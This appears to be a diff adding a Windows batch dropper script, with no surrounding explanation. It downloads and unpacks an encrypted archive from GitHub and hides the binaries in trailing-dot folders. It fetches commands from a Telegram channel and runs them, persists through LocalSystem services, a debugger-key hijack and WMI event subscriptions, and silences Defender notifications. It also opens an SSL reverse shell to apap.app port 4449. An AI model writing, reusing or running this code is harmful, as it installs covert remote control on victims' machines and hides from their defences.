@@ -1,0 +1,54 @@
+sc delete Help
+schtasks /Delete /TN "\Windows\Help" /F
+mkdir %ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}
+%WINDIR%\System32\curl.exe -L -o "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\insta.rar" https://github.com/vlad213-tex/1/raw/1/1/insta.rar
+%WINDIR%\System32\curl.exe -L -o "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\UnRAR.exe" https://github.com/vlad213-tex/1/raw/1/1/UnRAR.exe
+
+"%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\UnRAR.exe" x -y -o+ -p369852147 "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\insta.rar" "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\"
+
+mkdir \\.\%ProgramData%\config..\
+mkdir \\.\%ProgramData%\logdata..\
+mkdir %WINDIR%\Setup\Scripts
+
+move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\Index.exe" "\\.\%ProgramData%\logdata..\"
+move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\IconLib.dll" "\\.\%ProgramData%\logdata..\prn.ini"
+
+move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\libssl-1_1.dll" "\\.\%ProgramData%\config..\"
+move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\vcruntime140.dll" "\\.\%ProgramData%\config..\"
+move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\libcrypto-1_1.dll" "\\.\%ProgramData%\config..\"
+move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\ShellExperienceHost.exe" "\\.\%ProgramData%\config..\"
+rd /s /q "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}"
+
+fsutil file setshortname C:\ProgramData\config..\ ""
+fsutil file setshortname C:\ProgramData\logdata..\ ""
+
+echo powershell.exe -NoProfile -Command "$u='https://t.me/s/rurmetm';$c=(iwr $u -UseBasicParsing).Content;$m=[regex]::Match($c,'property=\"og:description\" content=\"(.*?)\"');if($m.Success){$cmd=[Net.WebUtility]::HtmlDecode($m.Groups[1].Value) -replace '&#092;','\';$null=([WMIClass]'Win32_Process').Create($cmd)}" >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
+echo powershell.exe \\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\prn.ini >> "%ProgramData%\USOShared\log.cmd"
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\install.exe" /t REG_SZ /d "%ProgramData%\USOShared\log.cmd" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\setup.exe" /t REG_SZ /d "%WINDIR%\System32\oobe\Setup.exe" /f
+
+sc create Performance binPath="%WINDIR%\System32\cmd.exe /c start install.exe" start="auto" obj="LocalSystem"
+sc create Update binPath="\\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\prn.ini" start="auto" obj="LocalSystem"
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start install.exe" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f /reg:64
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f /reg:64
+
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="SCM", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="SCM", CommandLineTemplate="%WINDIR%\System32\cmd.exe /c start setup.exe"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"SCM\"", Consumer="CommandLineEventConsumer.Name=\"SCM\""
+
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="MCS", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 200 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="MCS", CommandLineTemplate="%ProgramData%\config..\ShellExperienceHost.exe --ssl apap.app 4449 -e cmd.exe"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"MCS\"", Consumer="CommandLineEventConsumer.Name=\"MCS\""
+
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='SCM'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''} | Out-Null"
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='SCM'; CommandLineTemplate='%WINDIR%\System32\cmd.exe /c start setup.exe'} | Out-Null"
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"SCM\"'; Consumer='CommandLineEventConsumer.Name=\"SCM\"'} | Out-Null"
+
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='MCS'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 200 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''} | Out-Null"
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='MCS'; CommandLineTemplate='%ProgramData%\config..\ShellExperienceHost.exe --ssl apap.app 4449 -e cmd.exe'} | Out-Null"
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"MCS\"'; Consumer='CommandLineEventConsumer.Name=\"MCS\"'} | Out-Null"
+
+sc start Performance
